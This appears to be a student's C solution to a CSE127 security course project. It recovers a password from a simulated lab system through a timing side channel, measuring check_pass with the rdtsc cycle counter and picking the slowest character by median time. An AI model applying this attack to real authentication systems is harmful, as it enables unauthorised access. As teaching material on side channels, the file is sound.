/*******************************************************
  CSE127 Project
  User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

  CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int compare(const void * lhs, const void * rhs){
	return ( *(unsigned long*) lhs - *(unsigned long *)rhs);
}

int main(int argc, char **argv) {
	char guess[33];
	long startTime;
	long endTime;
	long median;

	int done = 0;
	long time[201];
	int currChar;
	char guessChar;
	// set guess to zeros
	bzero(guess, sizeof(guess));

	//
	// do the guessing (this is where your code goes)
	//   we suggest a loop over the size of the possible
	//   password, each time trying all possible characters
	//   and looking for time deviations




	while(!done){

	for(int i = 0; i < 12; i++){

		median = 0;

		for(int j = 33; j < 127; j++){
			guess[i] = j;		//add character to guess


			for(int k = 0; k < 201; k++){
				startTime = rdtsc();
				//done = check_pass(guess);
				done = check_pass(guess);
				endTime = rdtsc();
				time[k] = endTime - startTime;

			}

			//sort time to find median 

			qsort(time,201, sizeof(unsigned long), compare);

			if(time[100] > median){
				median = time[100];
				guessChar = j;
			}


			if (done) {
				printf("Password Found!\n");
				hack_system(guess);
			};
		}
		guess[i] = guessChar;
	}
	bzero(guess,sizeof(guess));
	}



	printf("Could not get the password!  Last guess was %s\n", guess);
	return 1;
};
